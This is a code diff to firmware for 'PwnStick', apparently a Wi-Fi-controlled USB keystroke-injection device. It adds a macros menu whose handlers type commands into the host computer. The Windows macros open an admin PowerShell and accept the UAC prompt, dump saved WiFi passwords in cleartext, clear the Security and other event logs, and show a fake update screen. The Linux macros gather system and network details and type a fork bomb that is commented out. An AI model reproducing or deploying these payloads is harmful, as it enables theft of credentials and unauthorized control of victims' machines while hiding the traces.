@@ -64,7 +64,7 @@ const char index_html[] PROGMEM = R"rawliteral(
 <!DOCTYPE html>
 <html>
 <head>
-<title>PwnStick v46</title>
+<title>PwnStick v47</title>
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
 <style>
 * { user-select:none; -webkit-user-select:none; box-sizing:border-box; }
@@ -76,7 +76,7 @@ body { background:#000; color:#0f0; font-family:monospace; margin:0; text-align:
 .content.active { display:flex; }
 button { background:#000; color:#0f0; border:1px solid #0f0; padding:10px; font-weight:bold; font-size:13px; border-radius:4px; transition:0.1s; flex:1; flex-shrink:0; }
 button:active { background:#0f0; color:#000; }
-button.toggled { background:#0f0 !important; color:#000 !important; box-shadow:0 0-10px #0f0; }
+button.toggled { background:#0f0 !important; color:#000 !important; box-shadow:0 0 10px #0f0; }
 .row { display:flex; gap:5px; width:100%; flex-shrink:0; }
 textarea { width:100%; height:45px; background:#111; color:#0f0; border:1px dashed #333; padding:8px; font-size:1.1em; outline:none; flex-shrink:0; user-select:auto; -webkit-user-select:auto; }
 #pad-wrap { flex:1; display:flex; flex-direction:column; min-height:80px; }
@@ -92,13 +92,31 @@ textarea { width:100%; height:45px; background:#111; color:#0f0; border:1px dash
 .opt-box { background:#111; border:1px solid #333; padding:8px; display:none; flex-direction:column; gap:4px; text-align:left; font-size:11px; flex-shrink:0; }
 .opt-row { display:flex; justify-content:space-between; align-items:center; }
 input[type=number] { background:#000; color:#0f0; border:1px solid #0f0; width:45px; padding:3px; }
+/* Modal */
+#modal { position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.9); display:none; flex-direction:column; padding:20px; z-index:100; }
+.modal-header { display:flex; gap:10px; margin-bottom:20px; }
+.modal-body { flex:1; overflow-y:auto; display:grid; grid-template-columns:1fr 1fr; gap:10px; padding-bottom:20px; }
+.modal-close { background:#333; color:#fff; border:none; padding:15px; border-radius:4px; margin-top:10px; }
 </style>
 </head>
 <body>
+<div id="modal">
+    <div class="modal-header">
+        <button id="m-win-os" class="toggled" onclick="os='win';wsS('O:win');uM()">WIN</button>
+        <button id="m-lin-os" onclick="os='lin';wsS('O:lin');uM()">LINUX</button>
+    </div>
+    <div id="m-list" class="modal-body"></div>
+    <button class="modal-close" onclick="document.getElementById('modal').style.display='none'">CLOSE</button>
+</div>
 <div class="tabs"><div class="tab active" onclick="sT('ctl',this)">CONTROL</div><div class="tab" onclick="sT('ig',this)">IMAGE</div></div>
 <div id="c-ctl" class="content active">
-    <div class="row"><button id="b-win-os" class="toggled" onclick="os='win';wsS('O:win');uOS()">WIN OS</button><button id="b-lin-os" onclick="os='lin';wsS('O:lin');uOS()">LINUX OS</button></div>
-    <div class="row"><button id="mod-win" onmousedown="mD('win',this)" onmouseup="mU('win',this)">WIN</button><button id="mod-ctrl" onmousedown="mD('ctrl',this)" onmouseup="mU('ctrl',this)">CTRL</button><button id="mod-alt" onmousedown="mD('alt',this)" onmouseup="mU('alt',this)">ALT</button><button id="mod-shift" onmousedown="mD('shift',this)" onmouseup="mU('shift',this)">SHIFT</button></div>
+    <div class="row">
+        <button id="mod-win" onmousedown="mD('win',this)" onmouseup="mU('win',this)">WIN</button>
+        <button id="mod-ctrl" onmousedown="mD('ctrl',this)" onmouseup="mU('ctrl',this)">CTRL</button>
+        <button id="mod-alt" onmousedown="mD('alt',this)" onmouseup="mU('alt',this)">ALT</button>
+        <button id="mod-shift" onmousedown="mD('shift',this)" onmouseup="mU('shift',this)">SHIFT</button>
+        <button onclick="oM()" style="background:#050;border-color:#0f0;color:#fff">MACROS</button>
+    </div>
     <textarea id="ta" placeholder="Type here..."></textarea>
     <div id="pad-wrap">
         <div id="pad">TRACKPAD</div>
@@ -123,13 +141,36 @@ input[type=number] { background:#000; color:#0f0; border:1px solid #0f0; width:4
 <script>
 let ws=new WebSocket('ws://'+location.host+'/ws');
 let os='win', isGif=false, gifBytes=null;
+const mcs = {
+    win: [
+        {n:'Admin PS', a:'ps_admin'}, {n:'WiFi Pass', a:'wifi_pass'}, 
+        {n:'Fake Update', a:'fake_upd'}, {n:'Notepad Ghost', a:'note_ghost'},
+        {n:'Clear Logs', a:'win_clr'}, {n:'System Info', a:'win_info'}
+    ],
+    lin: [
+        {n:'Recon', a:'lin_recon'}, {n:'Snake (SSH)', a:'snake'},
+        {n:'CMatrix', a:'cmatrix'}, {n:'Fake Bomb', a:'fork_bomb'},
+        {n:'Net Info', a:'lin_net'}, {n:'Home Listing', a:'lin_ls'}
+    ]
+};
 function wsS(m){if(ws.readyState===1)ws.send(m);}
 function sT(t,el){
 document.querySelectorAll('.tab').forEach(x=>x.classList.remove('active'));
 document.querySelectorAll('.content').forEach(x=>x.classList.remove('active'));
 el.classList.add('active'); document.getElementById('c-'+t).classList.add('active');
 }
-function uOS(){ document.getElementById('b-win-os').className=(os=='win'?'toggled':''); document.getElementById('b-lin-os').className=(os=='lin'?'toggled':''); }
+function oM(){ document.getElementById('modal').style.display='flex'; uM(); }
+function uM(){
+    document.getElementById('m-win-os').className=(os=='win'?'toggled':'');
+    document.getElementById('m-lin-os').className=(os=='lin'?'toggled':'');
+    let l=document.getElementById('m-list'); l.innerHTML='';
+    mcs[os].forEach(m=>{
+        let b=document.createElement('button'); b.innerText=m.n; 
+        b.onclick=()=>{ wsS('A:'+m.a); document.getElementById('modal').style.display='none'; };
+        l.appendChild(b);
+    });
+}
+function uOS(){ uM(); }
 function mD(m,el){ el.dataset.h=setTimeout(()=>{ el.classList.toggle('toggled'); wsS('H:'+m+','+(el.classList.contains('toggled')?'1':'0')); el.dataset.h=0; },500); }
 function mU(m,el){ if(el.dataset.h){ clearTimeout(el.dataset.h); wsS('P:'+m); el.dataset.h=0; } }
 let ta=document.getElementById('ta');
@@ -140,7 +181,7 @@ ta.onkeydown=e=>{
     if(e.key==='Backspace'){ e.preventDefault(); wsS('B:1'); return; }
 };
 ta.oninput=e=>{ if(e.inputType==='insertFromPaste'||ta.value.length>1){wsS('V:'+ta.value);ta.value='';}else{let c=ta.value.slice(-1);ta.value='';if(c)wsS('K:'+c);} };
-// Trackpad - Fixed Relative Drag with Sensitivity
+// Trackpad
 let p=document.getElementById('pad'),lX=0,lY=0,isD=false,tapT=0;
 p.onmousedown=e=>{ isD=true; lX=e.clientX; lY=e.clientY; tapT=Date.now(); };
 window.onmouseup=()=>{ if(isD && Date.now()-tapT<200) wsS('C:l'); isD=false; };
@@ -278,6 +319,17 @@ void handleWebSocketMessage(void *arg, uint8_t *data, size_t len) {
             else if(act=="arrowleft") Keyboard.write(KEY_LEFT_ARROW);
             else if(act=="arrowright") Keyboard.write(KEY_RIGHT_ARROW);
             else if(act=="cb") { Keyboard.press(KEY_LEFT_CTRL); Keyboard.press(KEY_BACKSPACE); delay(50); Keyboard.releaseAll(); }
+            else if(act=="ps_admin") { Keyboard.press(KEY_LEFT_GUI); Keyboard.press('x'); delay(200); Keyboard.releaseAll(); delay(500); Keyboard.print("a"); delay(1000); Keyboard.press(KEY_LEFT_ALT); Keyboard.print("y"); Keyboard.releaseAll(); }
+            else if(act=="wifi_pass") { Keyboard.press(KEY_LEFT_GUI); Keyboard.print("r"); delay(200); Keyboard.releaseAll(); delay(500); Keyboard.println("cmd"); delay(1000); Keyboard.println("netsh wlan show profiles * key=clear | findstr /C:\"Key Content\" /C:\"SSID name\""); }
+            else if(act=="fake_upd") { Keyboard.press(KEY_LEFT_GUI); Keyboard.print("r"); delay(200); Keyboard.releaseAll(); delay(500); Keyboard.println("https://fakeupdate.net/win10ue/"); delay(1000); Keyboard.write(KEY_F11); }
+            else if(act=="note_ghost") { Keyboard.press(KEY_LEFT_GUI); Keyboard.print("r"); delay(200); Keyboard.releaseAll(); delay(500); Keyboard.println("notepad"); delay(1000); Keyboard.println("I am watching you..."); }
+            else if(act=="win_clr") { Keyboard.press(KEY_LEFT_GUI); Keyboard.print("r"); delay(200); Keyboard.releaseAll(); delay(500); Keyboard.println("powershell -NoP -Command \"Clear-EventLog -LogName System,Application,Security\""); }
+            else if(act=="win_info") { Keyboard.press(KEY_LEFT_GUI); Keyboard.print("r"); delay(200); Keyboard.releaseAll(); delay(500); Keyboard.println("cmd /k systeminfo"); }
+            else if(act=="lin_recon") { Keyboard.press(KEY_LEFT_CTRL); Keyboard.press(KEY_LEFT_ALT); Keyboard.press('t'); delay(500); Keyboard.releaseAll(); delay(800); Keyboard.println("whoami; uname -a; ifconfig; ls -la ~"); }
+            else if(act=="cmatrix") { Keyboard.press(KEY_LEFT_CTRL); Keyboard.press(KEY_LEFT_ALT); Keyboard.press('t'); delay(500); Keyboard.releaseAll(); delay(800); Keyboard.println("cmatrix"); }
+            else if(act=="fork_bomb") { Keyboard.press(KEY_LEFT_CTRL); Keyboard.press(KEY_LEFT_ALT); Keyboard.press('t'); delay(500); Keyboard.releaseAll(); delay(800); Keyboard.println("# :(){ :|:& };:"); }
+            else if(act=="lin_net") { Keyboard.press(KEY_LEFT_CTRL); Keyboard.press(KEY_LEFT_ALT); Keyboard.press('t'); delay(500); Keyboard.releaseAll(); delay(800); Keyboard.println("ip addr; nmcli device wifi list"); }
+            else if(act=="lin_ls") { Keyboard.press(KEY_LEFT_CTRL); Keyboard.press(KEY_LEFT_ALT); Keyboard.press('t'); delay(500); Keyboard.releaseAll(); delay(800); Keyboard.println("ls -R ~"); }
             else if(act=="term") { if(targetOS=="win") { Keyboard.press(KEY_LEFT_GUI); Keyboard.press('r'); delay(300); Keyboard.releaseAll(); delay(800); Keyboard.println("cmd"); } else { Keyboard.press(KEY_LEFT_CTRL); Keyboard.press(KEY_LEFT_ALT); Keyboard.press('t'); delay(300); Keyboard.releaseAll(); } }
             else if(act=="calc") { if(targetOS=="win") { Keyboard.press(KEY_LEFT_GUI); Keyboard.press('r'); delay(300); Keyboard.releaseAll(); delay(800); Keyboard.println("calc"); } else { Keyboard.press(KEY_LEFT_ALT); Keyboard.press(KEY_F2); delay(500); Keyboard.releaseAll(); delay(1000); Keyboard.print("gnome-calculator"); delay(100); Keyboard.write(KEY_RETURN); } }
             else if(act=="rick") { if(targetOS=="win") { Keyboard.press(KEY_LEFT_GUI); Keyboard.press('r'); delay(300); Keyboard.releaseAll(); delay(800); Keyboard.println("https://www.youtube.com/watch?v=dQw4w9WgXcQ"); } else { Keyboard.press(KEY_LEFT_ALT); Keyboard.press(KEY_F2); delay(300); Keyboard.releaseAll(); delay(800); Keyboard.print("xdg-open 'https://www.youtube.com/watch?v=dQw4w9WgXcQ'"); delay(50); Keyboard.write(KEY_RETURN); } }
